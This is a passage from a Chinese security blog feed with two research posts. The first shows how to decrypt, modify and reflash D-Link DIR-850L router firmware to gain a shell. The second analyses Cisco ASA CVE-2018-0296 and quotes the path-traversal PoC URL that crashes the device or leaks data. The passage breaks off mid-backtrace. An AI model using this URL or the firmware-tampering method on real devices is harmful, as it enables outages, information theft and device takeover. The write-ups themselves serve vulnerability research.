        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在对IoT设备进行安全分析时，通常设备对我们而言像个”黑盒子”，通过给它提供输入然后观察它的反馈输出，而对设备的”内部”并不了解。如果能够通过某种方式进入设备”内部”，获取到设备的shell，则会对后续的分析提供极大的便利。</p><a id="more"></a><p>针对IoT设备，常见的获取设备shell的方式有以下几种：</p><ul><li>利用设备自身提供的telnet或ssh服务；</li><li>利用设备PCB板上预留的调试接口，如UART；</li><li>利用设备存在的已知漏洞，如命令注入漏洞；</li><li>利用设备提供的本地升级(或更新)机制。</li></ul><p>这里主要关注第4种方式，即<strong>利用设备提供的本地升级(或更新)机制来获取设备的shell</strong>。目前，很多厂商生产的设备都具备升级(或更新)的功能，包括在线升级和本地升级等方式。如果在升级功能的具体实现过程中缺乏对固件文件的有效校验，则可以利用这一”缺陷”，通过对固件文件进行修改及重打包，实现获取设备shell的目的。</p><blockquote><p>使用该方法的前提: (1) 能够获取到固件文件；(2) 能够成功对固件进行解压及重打包。</p></blockquote><p>有一些设备同时支持在线升级和本地升级两种方式，其中在线升级机制做得比较完善，但本地升级机制可能存在缺陷。对于本地升级机制存在的缺陷，可能有人认为危害很小，毕竟只能影响自己的设备，但其可能存在以下两个”隐患”：</p><ul><li><strong>“软件源”污染</strong>：有人通过对固件进行修改及重打包后，将其发布到网上，而其他人下载了该固件文件，然后对设备进行升级更新；</li><li><strong>“暴露”设备</strong>：利用本地升级机制的缺陷，可以进入设备”内部”对设备进行更深入的分析，发现设备存在的安全缺陷。</li></ul><blockquote><p>有些设备的在线升级(或更新)机制可能也存在缺陷，此时其危害会更大。</p></blockquote><p>下面以D-Link DIR-850L路由器为例，介绍如何利用设备的本地升级机制来获取设备的shell。</p><h3 id="固件初步分析"><a href="#固件初步分析" class="headerlink" title="固件初步分析"></a>固件初步分析</h3><p>从D-Link官网下载<code>DIR-850L</code>型号的路由器固件<code>DIR850LB1_FW221WWb01.bin</code> (截止到撰写本文时的最新版本，对应硬件版本为<code>B1</code>)，然后利用<code>Binwalk</code>工具对其分析，如下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW221WWb01.bin</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>由上可知，采用<code>Binwalk</code>工具没有任何输出。利用<code>Binwalk</code>工具计算一下该固件的熵，结果如下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk -E DIR850LB1_FW221WWb01.bin</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     ENTROPY</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Rising entropy edge (0.995199)</span><br></pre></td></tr></table></figure><img data-src="images/firmware_entropy.png" style="zoom:85%"><p>由上图可知，该固件的熵非常高，表明该固件很有可能是经过加密或混淆的(加密的可能性更大)，导致<code>Binwalk</code>工具分析提取失败，因此需要对该固件的加密方式进行分析。</p><blockquote><p>简单地说，一个系统越是有序，信息熵就越低；反之，一个系统越是混乱，信息熵就越高。<code>Binwalk</code>工具的作者曾介绍过熵、加密和混淆等内容，更多内容可参见文末的相关链接。</p></blockquote><h3 id="固件加解密分析"><a href="#固件加解密分析" class="headerlink" title="固件加解密分析"></a>固件加解密分析</h3><p>在Pierre 2017年的博客<span class="exturl" data-url="aHR0cHM6Ly9waWVycmVraW0uZ2l0aHViLmlvL2Jsb2cvMjAxNy0wOS0wOC1kbGluay04NTBsLW15ZGxpbmstY2xvdWQtMGRheXMtdnVsbmVyYWJpbGl0aWVzLmh0bWw=">Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol<i class="fa fa-external-link-alt"></i></span>中，批露了其在Dlink 850L路由器中发现的10个CVE漏洞信息，其中给出了DIR850L REVB型号固件的解密方式 (针对<code>DIR850LB1_FW207WWb05.bin</code>、<code>DIR850LB1 FW208WWb02.bin</code>固件，当时应该是最新版)。</p><p>从网上下载固件<code>DIR850LB1_FW207WWb05.bin</code>，利用<code>Binwalk</code>工具对其进行分析，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW207WWb05.bin</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>同样，<code>Binwalk</code>工具没有任何输出。采用文中提供的方式对该固件进行解密，再次进行分析，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW207WWb05_decrypt.bin</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: &quot;dev=/dev/mtdblock/1&quot;</span><br><span class="line">10380         0x288C          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5184868 bytes</span><br><span class="line">1704052       0x1A0074        PackImg section delimiter tag, little endian size: 10517760 bytes; big endian size: 8232960 bytes</span><br><span class="line">1704084       0x1A0094        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8231815 bytes, 2677 inodes, blocksize: 131072 bytes, created: 2016-03-29 04:08:14</span><br></pre></td></tr></table></figure><p>可以看到，经过解密之后，<code>Binwalk</code>工具能够成功对该固件进行提取分析。在采用同样的方式对最新版固件<code>DIR850LB1_FW221WWb01.bin</code>进行解密和分析，<code>Binwalk</code>工具还是分析失败，说明新版的固件更换了加密方式，原有的解密方式已经不适用了。</p><p>在这种情况下，如何对新版固件的加密方式进行分析呢？通常而言，固件从一种加密方式变为另一种加密方式，中间会有个”过渡”，常见的情形如下。</p><img data-src="images/firmware_encrypt_change.png" style="zoom:85%"><p>其中，在情形1中，存在某个中间版本的固件，其自身采用方式1进行加密，内部提供方式2进行解密；在情形2中，存在某个中间版本的固件，其自身没有加密，内部提供方式2进行解密。因此，只需要找到对应的中间版本固件，对其进行分析，就可以知道如何对新版固件进行解密。</p><p>通过对<code>DIR-850L</code> <code> REVB</code>型号的设备固件进行分析，发现其方式类似于情形2，中间版本固件为<code>DIR850LB1_FW210WWb03.bin</code>。找到中间版本的固件后，需要对固件中的解密代码进行定位，以分析其解密逻辑。</p><h4 id="加解密代码定位"><a href="#加解密代码定位" class="headerlink" title="加解密代码定位"></a>加解密代码定位</h4><p>由于老版本固件的加解密方式比较简单，这里选择对<code>2.07</code>版本的固件(<code>DIR850LB1_FW207WWb05.bin</code>)进行分析，来定位固件程序中与加解密相关的代码。</p><p>通过对固件进行解压提取，然后对文件系统中包含的二进制程序进行分析，发现其中的<code>cgibin</code>程序主要负责对http请求进行处理与响应，包括固件升级等。利用IDA Pro工具加载<code>cgibin</code>程序，<code>main()</code>函数的结构如下，其主要是根据不同的请求字符串进入不同的处理逻辑。</p><img data-src="images/cgibin_main_graph.png"><p>根据<code>main()</code>函数中的字符串<code>&quot;fwup.cgi&quot;</code>、<code>&quot;fwupdater&quot;</code>和<code>&quot;fwupload.cgi&quot;</code>等，对对应的处理逻辑函数进行分析，结合Pierre博客中给出的解密方式，最终定位到对应的解密代码在函数<code>sub_4086C0()</code>中，如下。</p><img data-src="images/firmware_decrypt_code.png" style="zoom:75%"><p>对应的函数调用图如下。</p><img data-src="images/call_graph.png" style="zoom:70%"><p>根据该调用路径，对<code>2.10</code>版本固件(<code>DIR850LB1_FW210WWb03.bin</code>)中的cgibin程序进行分析，定位与解密相关的代码片段，最终定位到函数<code>sub_4090E0()</code>。在函数<code>sub_4090E0()</code>中，除了有一个类似于老版本固件的解密流程外，在后面还有一部分逻辑与<code>AES</code>解密相关，可能是在原有基础上又采用了<code>AES</code>进行加密。</p><img data-src="images/new_firmware_decrypt_code.png" style="zoom:60%"><p>对应的函数调用图如下。</p><img data-src="images/new_call_graph.png" style="zoom:75%"><p>定位到固件解密代码后，可以通过静态代码分析和动态调试等方式理清代码的具体逻辑，进而编写相应的解密脚本，对固件进行解密。</p><h4 id="“意外”的收获"><a href="#“意外”的收获" class="headerlink" title="“意外”的收获"></a>“意外”的收获</h4><p>由前面的函数调用图可知，函数<code>sub_4090E0()</code>在函数<code>encrypt_main()</code>中被调用。在对固件解密代码进行定位的过程中注意到，<code>encrypt_main()</code>函数在调用<code>sub_4090E0()</code>时，旁边还有一些其他分支，比如错误处理分支<code>loc_4097E8</code>，如下。</p><img data-src="images/encrypt_main_error_branch.png" style="zoom:70%"><p><code>sub_408F8C()</code>函数主要是打印一些帮助信息，而在<code>encrypt_main()</code>函数的开始部分调用<code>getopt()</code>函数来解析参数，因此猜测<code>sub_408F8C()</code>打印的帮助信息就是<code>encrypt_main()</code>函数的用法。sub_408F8C()函数的内容如下。</p><img data-src="images/sub_408F8C.png" style="zoom:90%"><p>注意到其中的<code>&quot;encimg&quot;</code>字符串，而在对固件文件系统进行分析时，正好也有一个名称为<code>encimg</code>的程序，该程序的帮助说明与这个一样，猜测<code>encrypt_main()</code>函数的功能与它一样，即可以直接利用<code>encimg</code>程序对固件进行加解密。通过测试表明该猜想是正确的，这样就免去了人工分析解密代码处理逻辑的过程。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Usage of encimg</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> decrypt firmware</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> &lt;extracted_firmware_path&gt;/usr/sbin/encimg -i &lt;input_file&gt; -d -s &lt;key&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> encrypt firmware</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> &lt;extracted_firmware_path&gt;/usr/sbin/encimg -i &lt;input_file&gt; -e -s &lt;key&gt;</span></span><br></pre></td></tr></table></figure><h3 id="固件升级机制分析"><a href="#固件升级机制分析" class="headerlink" title="固件升级机制分析"></a>固件升级机制分析</h3><p>成功对固件进行解密后，还需要对固件的升级处理逻辑进行分析，看是否存在校验机制。一种方式是对与升级过程相关的代码进行分析，看代码中是否存在相关校验逻辑。另外，也可以采用”快速试错”的方式，即尝试通过对固件文件进行修改，然后重打包并进行升级，如果升级成功则说明其机制存在”缺陷”。经过测试，通过对固件文件进行修改及重打包后，可以成功升级。</p><blockquote><p>这里的校验机制是指对固件文件的校验，如文件签名校验、MD5值比对等，不包括固件头部的CRC校验等。</p></blockquote><p>另外，通过在升级过程中进行抓包分析，发现请求中仅包含与固件本身相关的内容。这种仅依赖于固件文件本身的本地升级校验机制，若在实现过程中考虑不周，则很容易存在问题。相比于本地升级而言，在线升级机制可以做得更完善，因为在通信过程中可以从服务器获取一些除固件文件之外的其他信息，比如文件MD5值等，当然也需要配合使用其他的技术，如通信加密等。</p><h3 id="固件修改及重打包"><a href="#固件修改及重打包" class="headerlink" title="固件修改及重打包"></a>固件修改及重打包</h3><p>在对固件进行解密后，可以利用<code>firmware-mod-kit</code>工具对固件进行解压，然后对固件文件系统进行修改，比如在启动时开启<code>telnet</code>/<code>ssh</code>服务，或者植入其他程序，修改完成之后再进行重打包即可。</p><p>之后再对固件进行加密，对设备进行升级之后就可以成功获取设备的shell了。</p><p>总的来说，当利用其他方式无法获取设备shell时，从固件的升级机制入手，可能会有意想不到的收获。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1JlRmlybUxhYnMvYmlud2Fsaw==">Binwalk<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5kZXZ0dHlzMC5jb20vMjAxMy8wNi9kaWZmZXJlbnRpYXRlLWVuY3J5cHRpb24tZnJvbS1jb21wcmVzc2lvbi11c2luZy1tYXRoLw==">Differentiate Encryption From Compression Using Math<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5kZXZ0dHlzMC5jb20vMjAxMy8wNi9lbmNyeXB0aW9uLXZzLWNvbXByZXNzaW9uLXBhcnQtMi8=">Encryption vs Compression, Part 2<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9waWVycmVraW0uZ2l0aHViLmlvL2Jsb2cvMjAxNy0wOS0wOC1kbGluay04NTBsLW15ZGxpbmstY2xvdWQtMGRheXMtdnVsbmVyYWJpbGl0aWVzLmh0bWw=">Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhbXBhZ2VYL2Zpcm13YXJlLW1vZC1raXQ=">firmware-mod-kit<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于信安之路，文章链接：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvejMzTDRabVlPekZkRlR2OEh2ck0zdw==">https://mp.weixin.qq.com/s/z33L4ZmYOzFdFTv8HvrM3w<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> IoT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 固件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-0296 Cisco ASA 拒绝服务漏洞分析</title>
      <link href="2019/03/01/CVE-2018-0296-Cisco-ASA-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>2019/03/01/CVE-2018-0296-Cisco-ASA-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><code>CVE-2018-0296</code>是思科<code>ASA</code>设备<code>Web</code>服务中存在的一个拒绝服务漏洞，远程未认证的攻击者利用该漏洞可造成设备崩溃重启。该漏洞最初由来自<code>Securitum</code>的安全研究人员<code>Michal Bentkowski </code>发现，其在<span class="exturl" data-url="aHR0cHM6Ly9zZWt1cmFrLnBsL29waXMtYmxlZHUtY3ZlLTIwMTgtMDI5Ni1vbWluaWVjaWUtdXdpZXJ6eXRlbG5pZW5pYS13LXdlYmludGVyZmVqc2llLWNpc2NvLWFzYS8=">博客<i class="fa fa-external-link-alt"></i></span>中提到该漏洞最初是一个认证绕过漏洞，上报给思科后，最终被归类为拒绝服务漏洞。据思科发布的<span class="exturl" data-url="aHR0cHM6Ly90b29scy5jaXNjby5jb20vc2VjdXJpdHkvY2VudGVyL2NvbnRlbnQvQ2lzY29TZWN1cml0eUFkdmlzb3J5L2Npc2NvLXNhLTIwMTgwNjA2LWFzYWZ0ZA==">安全公告<i class="fa fa-external-link-alt"></i></span>显示：针对部分型号的设备，该漏洞可造成设备崩溃重启；而针对其他型号的设备，利用该漏洞可获取设备的敏感信息，造成信息泄露。</p><a id="more"></a><p>针对该漏洞，目前已有公开的<code>PoC</code>脚本，可用于获取设备的敏感信息如用户名，或造成设备崩溃重启。经过实际测试，在公开<code>PoC</code>中造成该漏洞的关键<code>url</code>如下。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;ip&gt;:&lt;port&gt;/+CSCOU+/../+CSCOE+/files/file_list.json?path=/</span><br></pre></td></tr></table></figure><p>下面利用思科<code>ASA</code>设备和已有的<code>PoC</code>脚本，对该漏洞的形成原因进行分析。</p><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>在实际对漏洞进行分析的过程中，发现思科<code>ASA</code>设备的<code>lina</code>程序中，存在大量的<code>Lua</code>脚本以及对<code>Lua</code> <code>api</code>的调用。为了便于理解，下面对<code>Lua</code>脚本的相关知识进行简单介绍。</p><h4 id="Lua脚本和C-C-交互"><a href="#Lua脚本和C-C-交互" class="headerlink" title="Lua脚本和C/C++交互"></a><code>Lua</code>脚本和<code>C/C++</code>交互</h4><p><code>Lua</code>是一个小巧的脚本语言，其设计目的是为了嵌入应用程序中，从而为应用程序提供灵活的扩展和定制功能。<code>Lua脚本</code>可以很容易被<code>C/C++</code>代码调用，也可以反过来调用<code>C/C++</code>的函数，这使得<code>Lua</code>在应用程序中可以被广泛使用。不仅可作为扩展脚本，也可以作为普通的配置文件，代替<code>XML</code>、<code>ini</code>等文件格式，并且更容易理解和维护。</p><p><code>Lua</code>和<code>C/C++</code>通信的主要方式是一个虚拟栈，其特点是后进先出。在<code>Lua</code>中，<code>Lua</code>栈就是一个<code>struct</code>，栈的索引可以是正数也可以是负数，其中正数索引<code>1</code>永远表示栈底，负数索引<code>-1</code>永远表示栈顶，如下图所示。</p><img data-src="images/lua_stack.png" style="zoom:70%"><p><code>Lua</code>中的栈在<code>stack_init()</code>函数中创建，其类似于下面的定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TObject <span class="built_in">stack</span>[BASIC_STACK_SIZE + EXTRA_STACK]</span><br></pre></td></tr></table></figure><p>在<code>Lua</code>中，可以往栈上压入字符串、数值、表和闭包等类型，最后统一用<code>Tobject</code>这种数据结构进行保存，如下。<code>TObject</code>结构对应于<code>Lua</code>中所有的数据类型，是一个<code>&#123;值，类型&#125;</code>结构，它将值和类型绑在一起。其中用<code>tt</code>表示<code>value</code>的类型，<code>value</code>是一个联合体，共有4个域，说明如下。</p><ul><li><code>p</code>：可以保存一个指针，实际上指向<code>Lua</code>中的<code>light userdata</code>结构</li><li><code>n</code>：保存数值，包括<code>int</code>、<code>float</code>等类型</li><li><code>b</code>：保存布尔值</li><li><code>gc</code>：保存需要内存管理垃圾回收的类型如<code>string</code>、<code>table</code>、<code>closure</code>等</li></ul><img data-src="images/lua_tobject.png"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lua 数据类型</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LUA_TNONE(-1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LUA_TNIL0<span class="comment">// 空值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LUA_TBOOLEAN1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LUA_TLIGHTUSERDATA2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LUA_TNUMBER3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LUA_TSTRING4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LUA_TTABLE5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LUA_TFUNCTION6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LUA_TUSERDATA7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LUA_TTHREAD8</span></span><br></pre></td></tr></table></figure><h4 id="Lua-栈操作常用api"><a href="#Lua-栈操作常用api" class="headerlink" title="Lua 栈操作常用api"></a><code>Lua</code> 栈操作常用<code>api</code></h4><p><code>Lua</code>中提供了一系列与栈操作相关的<code>api</code>，常用的<code>api</code>如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 压入元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lua_pushnil</span> <span class="params">(lua_State *L)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lua_pushboolean</span> <span class="params">(lua_State *L, <span class="keyword">int</span> <span class="keyword">bool</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lua_pushnumber</span> <span class="params">(lua_State *L, <span class="keyword">double</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lua_pushlstring</span> <span class="params">(lua_State *L, <span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">size_t</span> length)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lua_pushstring</span> <span class="params">(lua_State *L, <span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查一个元素是否是一个指定的类型</span></span><br><span class="line"><span class="keyword">int</span> lua_is* (lua_State *L, <span class="keyword">int</span> index);<span class="comment">// *可以是任何类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取元素</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>           <span class="title">lua_toboolean</span> <span class="params">(lua_State *L, <span class="keyword">int</span> index)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">double</span>        <span class="title">lua_tonumber</span> <span class="params">(lua_State *L, <span class="keyword">int</span> index)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *  <span class="title">lua_tostring</span> <span class="params">(lua_State *L, <span class="keyword">int</span> index)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span>        <span class="title">lua_strlen</span> <span class="params">(lua_State *L, <span class="keyword">int</span> index)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h4><p>由于该漏洞在不同型号设备上表现的行为不一致，这里分别选取了32位的设备和64位的设备，相关信息如下。其中，前面2个设备用于漏洞分析，设备<code>asav9101</code>用于补丁分析。</p><ul><li>真实设备<code>ASA 5505</code>，镜像为<code>asa924-k8.bin</code> ，<code>32bit</code></li><li><code>GNS3</code>仿真设备，镜像为<code>asav962.qcow2</code>，<code>64bit</code> </li><li><code>GNS3</code>仿真设备，镜像为<code>asav9101.qcow2</code>，<code>64bit</code></li></ul><p><code>ASA</code>设备中内置了<code>gdbsever</code>，但默认不启动。为了对设备进行调试，需要修改镜像文件以启动<code>gdbserver</code>。同时，由于<code>ASA</code>设备会对镜像文件进行完整性校验，所以修改后的镜像文件无法直接通过<code>tftp</code>或<code>ASDM</code>工具传入设备。<code>ASA</code>使用CF卡作为存储设备，可以通过用CF卡读卡器直接将镜像写入CF卡中的方式绕过校验，因为<code>ASA</code>没有对CF中的镜像进行校验。</p><p>详细的调试环境搭建和镜像修改等内容可以参考<code>nccgroup</code>的系列<span class="exturl" data-url="aHR0cHM6Ly93d3cubmNjZ3JvdXAudHJ1c3QvdWsvYWJvdXQtdXMvbmV3c3Jvb20tYW5kLWV2ZW50cy9ibG9ncy8yMDE3L3NlcHRlbWJlci9jaXNjby1hc2Etc2VyaWVzLXBhcnQtb25lLWludHJvLXRvLXRoZS1jaXNjby1hc2Ev">博客<i class="fa fa-external-link-alt"></i></span>.</p><h4 id="设备配置"><a href="#设备配置" class="headerlink" title="设备配置"></a>设备配置</h4><p>思科ASA设备会在<code>443</code>端口提供Web服务。笔者在进行测试时，对设备的<code>WebVPN</code>功能(<code>Clientless SSL VPN</code>)进行了配置，使得可以访问Web服务，进而触发该漏洞。详细的配置操作可参考思科<span class="exturl" data-url="aHR0cHM6Ly93d3cuY2lzY28uY29tL2MvZW4vdXMvc3VwcG9ydC9kb2NzL3NlY3VyaXR5LXZwbi93ZWJ2cG4tc3NsLXZwbi8xMTk0MTctY29uZmlnLWFzYS0wMC5odG1s">相关文档<i class="fa fa-external-link-alt"></i></span>。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>环境搭建好后，运行已有的<code>PoC</code>脚本，针对<code>asa924</code>设备，会造成敏感信息泄露，而针对<code>asav962</code>设备，会造成设备崩溃重启。下面基于<code>asav962</code>设备，重点对拒绝服务漏洞进行分析。</p><h4 id="崩溃分析"><a href="#崩溃分析" class="headerlink" title="崩溃分析"></a>崩溃分析</h4><p>运行<code>PoC</code>脚本，在<code>gdb</code>中捕获到如下错误。可以看到，崩溃点在<code>libc.so.6</code>库中的<code>strlen()</code>函数里，由于在<code>0x7ffff497699a</code>处尝试访问一个非法的内存地址<code>0x13</code>，故产生<code>Segmentation fault</code>错误，而<code>rax</code>的值来源于<code>strlen()</code>函数的参数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Thread 2 received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[Switching to Thread 1677]</span><br><span class="line">0x00007ffff497699a in strlen () from ***/_asav962.qcow2.extracted/rootfs/lib64/libc.so.6</span><br><span class="line">(gdb) x/10i $rip</span><br><span class="line">=&gt; 0x7ffff497699a &lt;strlen+42&gt;:  movdqu xmm12,XMMWORD PTR [rax]</span><br><span class="line">   0x7ffff497699f &lt;strlen+47&gt;:  pcmpeqb xmm12,xmm8</span><br><span class="line">   0x7ffff49769a4 &lt;strlen+52&gt;:  pmovmskb edx,xmm12</span><br><span class="line">   0x7ffff49769a9 &lt;strlen+57&gt;:  test   edx,edx</span><br><span class="line">   0x7ffff49769ab &lt;strlen+59&gt;:  je     0x7ffff49769b1 &lt;strlen+65&gt;</span><br><span class="line">   0x7ffff49769ad &lt;strlen+61&gt;:  bsf    eax,edx</span><br><span class="line">   0x7ffff49769b0 &lt;strlen+64&gt;:  ret</span><br><span class="line">   0x7ffff49769b1 &lt;strlen+65&gt;:  and    rax,0xfffffffffffffff0</span><br><span class="line">   0x7ffff49769b5 &lt;strlen+69&gt;:  pcmpeqb xmm9,XMMWORD PTR [rax+0x10]</span><br><span class="line">   0x7ffff49769bb &lt;strlen+75&gt;:  pcmpeqb xmm10,XMMWORD PTR [rax+0x20]</span><br><span class="line">(gdb) i r $rax</span><br><span class="line">rax            0x13     19</span><br><span class="line">(gdb) bt</span><br><span class="line"><span class="meta">#</span><span class="bash">0  0x00007ffff497699a <span class="keyword">in</span> strlen () from ***/_asav962.qcow2.extracted/rootfs/lib64/libc.so.6</span></span><br><span class="line"><span class="meta">#</span><span class="bash">1  0x0000555557ee51ce <span class="keyword">in</span> lua_pushstring ()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">2  0x00005555583c87d2 <span class="keyword">in</span> webvpn_file_name ()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">3  0x0000555557eec43b <span class="keyword">in</span> luaD_precall ()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">4  0x0000555557efc258 <span class="keyword">in</span> luaV_execute ()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">5  0x0000555557eeced0 <span class="keyword">in</span> luaD_call ()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">6  0x0000555557eebeda <span class="keyword">in</span> luaD_rawrunprotected ()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">7  0x0000555557eed323 <span class="keyword">in</span> luaD_pcall ()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">8  0x0000555557ee5de6 <span class="keyword">in</span> lua_pcall ()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">9  0x0000555557f00821 <span class="keyword">in</span> lua_dofile ()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">10 0x000055555822053b <span class="keyword">in</span> aware_run_lua_script_ns ()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">11 0x0000555557dc6e3d <span class="keyword">in</span> ak47_new_stack_call ()</span></span><br><span class="line">Backtrace stopped: previous frame inner 